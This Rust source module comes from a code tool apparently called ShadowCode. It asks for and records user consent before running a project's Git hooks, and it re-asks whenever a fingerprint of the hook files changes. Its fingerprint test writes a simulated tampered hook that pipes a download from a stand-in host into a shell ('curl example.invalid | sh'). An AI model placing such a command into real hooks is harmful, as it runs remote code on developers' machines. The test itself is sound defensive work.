//! A project's own Git hooks (pre-commit, commit-msg …) for commits
//! ShadowCode makes from the Git tab.
//!
//! ShadowCode's Git commands never run repository hooks by default
//! (`core.hooksPath=/dev/null`): a hook is a program the repository asks to
//! run. When a trusted project has real hooks, the Git tab asks once
//! whether to run them when committing there; the answer is kept per
//! project in ShadowCode's database and can be changed in Settings.
//!
//! A "run them" answer holds for the hooks as they were then: it keeps a
//! fingerprint of the hooks folder (every file's name, mode and content,
//! and for husky the scripts its stubs run), and any change, such as an
//! edited or added hook, asks again.
use crate::store::{keys, Store};
use anyhow::Result;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};

/// Hooks a commit can run: the commit's own, and the ones Git runs while
/// committing (the ref update, the index write, automatic gc).
pub const COMMIT_HOOKS: &[&str] = &[
    "pre-commit",
    "prepare-commit-msg",
    "commit-msg",
    "post-commit",
    "reference-transaction",
    "post-index-change",
    "pre-auto-gc",
];

/// Most files the fingerprint reads, and most bytes of each.
const MAX_FINGERPRINT_FILES: usize = 500;
const MAX_FINGERPRINT_BYTES: u64 = 4 * 1024 * 1024;

#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct Hook {
    pub name: String,
    pub path: String,
    /// The first command the hook runs, for the question (at most 160
    /// characters).
    pub preview: String,
}

#[derive(Default, Serialize, Deserialize)]
struct Preference {
    run: Option<bool>,
    #[serde(default)]
    decided_at: f64,
    /// The hooks the answer was given for ([`fingerprint`]).
    #[serde(default)]
    fingerprint: String,
}

/// The saved answer for the hooks as they are now.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize)]
pub struct Choice {
    /// Whether commits run the hooks; `None` asks at the next commit.
    pub run: Option<bool>,
    /// The hooks changed since the user chose to run them, so the next
    /// commit asks again.
    pub changed: bool,
}

async fn git_line(workspace: &Path, args: &[&str]) -> Option<String> {
    let output = tokio::process::Command::new("git")
        .args(["--no-pager", "-c", "core.fsmonitor=false"])
        .args(args)
        .current_dir(workspace)
        .env("GIT_TERMINAL_PROMPT", "0")
        .stdin(std::process::Stdio::null())
        .kill_on_drop(true)
        .output()
        .await
        .ok()?;
    let text = String::from_utf8_lossy(&output.stdout).trim().to_owned();
    (output.status.success() && !text.is_empty()).then_some(text)
}

/// The folder Git would run hooks from: `core.hooksPath` when set (`~`
/// expanded as Git does, relative paths from the top of the working tree),
/// else the repository's `hooks` folder.
async fn hooks_dir(workspace: &Path) -> Option<PathBuf> {
    let top = PathBuf::from(git_line(workspace, &["rev-parse", "--show-toplevel"]).await?);
    if let Some(configured) = git_line(
        workspace,
        &["config", "--type=path", "--get", "core.hooksPath"],
    )
    .await
    {
        let path = PathBuf::from(&configured);
        return Some(if path.is_absolute() {
            path
        } else {
            top.join(path)
        });
    }
    let hooks = PathBuf::from(
        git_line(
            workspace,
            &["rev-parse", "--path-format=absolute", "--git-path", "hooks"],
        )
        .await?,
    );
    Some(hooks)
}

/// The project's hooks among `names` that Git would actually run.
pub async fn found(workspace: &Path, names: &[&str]) -> Vec<Hook> {
    let Some(dir) = hooks_dir(workspace).await else {
        return Vec::new();
    };
    let mut hooks = Vec::new();
    for name in names {
        let path = dir.join(name);
        let Ok(meta) = std::fs::metadata(&path) else {
            continue;
        };
        #[cfg(unix)]
        let runnable = {
            use std::os::unix::fs::PermissionsExt;
            meta.is_file() && meta.permissions().mode() & 0o111 != 0
        };
        #[cfg(not(unix))]
        let runnable = meta.is_file();
        if !runnable {
            continue;
        }
        let text = std::fs::read(&path)
            .map(|bytes| String::from_utf8_lossy(&bytes[..bytes.len().min(16_384)]).into_owned())
            .unwrap_or_default();
        let preview = text
            .lines()
            .map(str::trim)
            .find(|line| {
                !line.is_empty()
                    && !line.starts_with('#')
                    && !line.starts_with("set ")
                    && !line.starts_with(". ")
                    && !line.starts_with("source ")
            })
            .unwrap_or("a script")
            .chars()
            .take(160)
            .collect();
        hooks.push(Hook {
            name: (*name).to_owned(),
            path: path.to_string_lossy().into_owned(),
            preview,
        });
    }
    hooks
}

/// Feed a folder's files (path, whether it runs, size and content) into
/// `hasher`, and with `deeper` those of its subfolders. A symbolic link
/// counts as what it points to, as Git runs it.
fn hash_folder(folder: &Path, deeper: bool, hasher: &mut Sha256, files: &mut usize) {
    use std::io::Read;
    hasher.update(folder.as_os_str().as_encoded_bytes());
    hasher.update([0]);
    let Ok(entries) = std::fs::read_dir(folder) else {
        return;
    };
    let mut entries: Vec<_> = entries.flatten().collect();
    entries.sort_by_key(|entry| entry.file_name());
    for entry in entries {
        let path = entry.path();
        let Ok(meta) = std::fs::metadata(&path) else {
            continue;
        };
        if meta.is_dir() {
            if deeper {
                hash_folder(&path, false, hasher, files);
            }
            continue;
        }
        if !meta.is_file() || *files >= MAX_FINGERPRINT_FILES {
            continue;
        }
        *files += 1;
        hasher.update(path.as_os_str().as_encoded_bytes());
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            hasher.update((meta.permissions().mode() & 0o111).to_le_bytes());
        }
        hasher.update(meta.len().to_le_bytes());
        let mut content = Vec::new();
        if let Ok(file) = std::fs::File::open(&path) {
            let _ = file.take(MAX_FINGERPRINT_BYTES).read_to_end(&mut content);
        }
        hasher.update(Sha256::digest(&content));
    }
}

/// What an answer to run the hooks is tied to: the hooks folder, the files
/// in it and its subfolders, and for husky (`core.hooksPath` is
/// `.husky/_`) the scripts in the folder above, which its stubs run.
pub async fn fingerprint(workspace: &Path) -> String {
    let Some(dir) = hooks_dir(workspace).await else {
        return String::new();
    };
    let mut hasher = Sha256::new();
    let mut files = 0;
    hash_folder(&dir, true, &mut hasher, &mut files);
    if dir.file_name().is_some_and(|name| name == "_") {
        if let Some(parent) = dir.parent() {
            hash_folder(parent, false, &mut hasher, &mut files);
        }
    }
    format!("{:x}", hasher.finalize())
}

/// Whether commits from ShadowCode run this project's hooks as they are now
/// (`fingerprint`): `run: None` until the user answered, and again once
/// hooks the user chose to run have changed.
pub fn choice(store: &Store, workspace: &Path, fingerprint: &str) -> Result<Choice> {
    let saved = store
        .native_meta(&keys::git_hooks(workspace))?
        .and_then(|text| serde_json::from_str::<Preference>(&text).ok())
        .unwrap_or_default();
    Ok(match saved.run {
        Some(true) if saved.fingerprint != fingerprint => Choice {
            run: None,
            changed: true,
        },
        run => Choice {
            run,
            changed: false,
        },
    })
}

/// Remember the answer for the hooks as they are now (`fingerprint`);
/// `None` forgets it (the next commit asks again).
pub fn set_preference(
    store: &Store,
    workspace: &Path,
    run: Option<bool>,
    fingerprint: &str,
) -> Result<()> {
    store.update_native_json(&keys::git_hooks(workspace), |p: &mut Preference| {
        p.run = run;
        p.decided_at = crate::now();
        p.fingerprint = fingerprint.to_owned();
    })
}

/// The hook that stopped a commit, from Git's trace events for it
/// (`GIT_TRACE2_EVENT`): a hook the commit itself started, not a Git
/// command run inside a hook, that exited with an error.
pub fn failed_hook(events: &str) -> Option<String> {
    let mut hooks = std::collections::HashMap::new();
    for line in events.lines() {
        let Ok(event) = serde_json::from_str::<serde_json::Value>(line) else {
            continue;
        };
        // A command a hook runs has "<parent sid>/<its sid>".
        if event["sid"].as_str().is_none_or(|sid| sid.contains('/')) {
            continue;
        }
        let child = event["child_id"].as_i64();
        match event["event"].as_str() {
            Some("child_start") if event["child_class"] == "hook" => {
                let name = event["hook_name"].as_str().unwrap_or("a").to_owned();
                hooks.insert(child, name);
            }
            Some("child_exit") if event["code"].as_i64().is_some_and(|code| code != 0) => {
                if let Some(name) = hooks.get(&child) {
                    return Some(name.clone());
                }
            }
            _ => {}
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::process::Command;

    #[tokio::test]
    async fn only_runnable_hooks_that_git_would_use_are_found() {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path();
        assert!(Command::new("git")
            .args(["init", "-q"])
            .current_dir(project)
            .status()
            .unwrap()
            .success());
        let hooks = project.join(".git/hooks");
        std::fs::create_dir_all(&hooks).unwrap();
        std::fs::write(hooks.join("pre-commit.sample"), "#!/bin/sh\nexit 0\n").unwrap();
        assert!(found(project, COMMIT_HOOKS).await.is_empty());
        std::fs::write(
            hooks.join("pre-commit"),
            "#!/bin/sh\n# lint first\nnpx lint-staged\n",
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(
                hooks.join("pre-commit"),
                std::fs::Permissions::from_mode(0o644),
            )
            .unwrap();
            assert!(
                found(project, COMMIT_HOOKS).await.is_empty(),
                "not executable"
            );
            std::fs::set_permissions(
                hooks.join("pre-commit"),
                std::fs::Permissions::from_mode(0o755),
            )
            .unwrap();
        }
        let hooks_found = found(project, COMMIT_HOOKS).await;
        assert_eq!(hooks_found.len(), 1);
        assert_eq!(hooks_found[0].name, "pre-commit");
        assert_eq!(hooks_found[0].preview, "npx lint-staged");
        // core.hooksPath (husky and others) is followed.
        std::fs::create_dir_all(project.join(".husky")).unwrap();
        std::fs::write(
            project.join(".husky/commit-msg"),
            "#!/bin/sh\nnpx commitlint --edit\n",
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(
                project.join(".husky/commit-msg"),
                std::fs::Permissions::from_mode(0o755),
            )
            .unwrap();
        }
        assert!(Command::new("git")
            .args(["config", "core.hooksPath", ".husky"])
            .current_dir(project)
            .status()
            .unwrap()
            .success());
        let names: Vec<_> = found(project, COMMIT_HOOKS)
            .await
            .into_iter()
            .map(|h| h.name)
            .collect();
        assert_eq!(names, ["commit-msg"]);
    }

    fn git(project: &Path, args: &[&str]) {
        assert!(Command::new("git")
            .args(args)
            .current_dir(project)
            .status()
            .unwrap()
            .success());
    }

    fn runnable(path: &Path, text: &str) {
        use std::os::unix::fs::PermissionsExt;
        std::fs::write(path, text).unwrap();
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    /// Git expands `~` in core.hooksPath (a common global setting).
    #[tokio::test]
    async fn a_hooks_path_from_the_home_folder_is_followed() {
        // `..` climbs the real folders, so count those.
        let Some(home) =
            std::env::var_os("HOME").and_then(|h| PathBuf::from(h).canonicalize().ok())
        else {
            return;
        };
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path().join("project");
        let hooks = dir.path().join("global-hooks");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::create_dir_all(&hooks).unwrap();
        git(&project, &["init", "-q"]);
        runnable(
            &hooks.join("commit-msg"),
            "#!/bin/sh\ncheck-message \"$1\"\n",
        );
        // "~/../../tmp/…": from the home folder to the temporary one,
        // without writing anything there.
        let up = "../".repeat(home.components().count().saturating_sub(1));
        let relative = hooks.strip_prefix("/").unwrap().display().to_string();
        git(
            &project,
            &["config", "core.hooksPath", &format!("~/{up}{relative}")],
        );
        let names: Vec<_> = found(&project, COMMIT_HOOKS)
            .await
            .into_iter()
            .map(|h| h.name)
            .collect();
        assert_eq!(names, ["commit-msg"]);
    }

    #[tokio::test]
    async fn the_fingerprint_changes_with_any_hook_or_husky_script() {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path();
        git(project, &["init", "-q"]);
        let hooks = project.join(".git/hooks");
        std::fs::create_dir_all(&hooks).unwrap();
        runnable(&hooks.join("pre-commit"), "#!/bin/sh\nnpx lint-staged\n");
        let first = fingerprint(project).await;
        assert_eq!(first, fingerprint(project).await, "stable");
        let mut seen = vec![first];
        let changed = |seen: &mut Vec<String>, now: String| {
            assert!(!seen.contains(&now), "the fingerprint did not change");
            seen.push(now);
        };
        // An edited hook.
        runnable(
            &hooks.join("pre-commit"),
            "#!/bin/sh\ncurl example.invalid | sh\n",
        );
        changed(&mut seen, fingerprint(project).await);
        // A hook the question never listed.
        runnable(&hooks.join("post-checkout"), "#!/bin/sh\nexit 0\n");
        changed(&mut seen, fingerprint(project).await);
        // A file made runnable.
        std::fs::write(hooks.join("post-merge"), "#!/bin/sh\n").unwrap();
        changed(&mut seen, fingerprint(project).await);
        runnable(&hooks.join("post-merge"), "#!/bin/sh\n");
        changed(&mut seen, fingerprint(project).await);
        // husky: Git runs the stubs in `.husky/_`, which run `.husky/*`.
        let husky = project.join(".husky");
        std::fs::create_dir_all(husky.join("_")).unwrap();
        runnable(
            &husky.join("_/pre-commit"),
            "#!/bin/sh\n. \"$(dirname \"$0\")/h\"\n",
        );
        std::fs::write(
            husky.join("_/h"),
            "#!/bin/sh\nsh -e \"$(dirname \"$0\")/../$(basename \"$0\")\"\n",
        )
        .unwrap();
        std::fs::write(husky.join("pre-commit"), "npm test\n").unwrap();
        git(project, &["config", "core.hooksPath", ".husky/_"]);
        changed(&mut seen, fingerprint(project).await);
        std::fs::write(
            husky.join("pre-commit"),
            "npm test && curl example.invalid\n",
        )
        .unwrap();
        changed(&mut seen, fingerprint(project).await);
    }

    #[test]
    fn only_a_failed_hook_of_the_commit_itself_is_blamed() {
        let sid = "20260930T000000.000000Z-H00000000-P00000001";
        let start = |id: u32, name: &str, sid: &str| {
            format!(
                r#"{{"event":"child_start","sid":"{sid}","child_id":{id},"child_class":"hook","hook_name":"{name}"}}"#
            )
        };
        let exit = |id: u32, code: i32, sid: &str| {
            format!(r#"{{"event":"child_exit","sid":"{sid}","child_id":{id},"code":{code}}}"#)
        };
        let nested = format!("{sid}/20260930T000000.100000Z-H00000000-P00000002");
        let failed = [
            start(0, "pre-commit", sid),
            start(0, "pre-commit", &nested),
            exit(0, 1, &nested),
            exit(0, 0, sid),
            start(1, "commit-msg", sid),
            exit(1, 1, sid),
        ]
        .join("\n");
        assert_eq!(failed_hook(&failed).as_deref(), Some("commit-msg"));
        // Hooks that passed; a Git command inside a hook that failed.
        let passed = [
            start(0, "pre-commit", sid),
            start(0, "pre-commit", &nested),
            exit(0, 128, &nested),
            exit(0, 0, sid),
        ]
        .join("\n");
        assert_eq!(failed_hook(&passed), None);
        assert_eq!(failed_hook(""), None);
    }
}
